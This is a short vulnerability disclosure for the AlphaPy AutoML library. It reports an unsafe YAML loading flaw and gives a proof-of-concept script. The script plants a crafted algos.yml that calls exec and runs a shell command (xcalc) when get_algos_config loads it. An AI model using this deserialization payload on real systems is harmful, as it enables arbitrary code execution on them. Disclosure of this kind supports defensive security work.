# Description

`AlphaPy` Automated Machine Learning [AutoML] with Python, scikit-learn, Keras, XGBoost, LightGBM, and CatBoost . It is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
pip install alphapy
```

### Run exploit.py
```
import os
#os.system('pip3 install alphapy')
from alphapy import estimators
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('algos.yml','w+').write(exploit)
estimators.get_algos_config('.')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
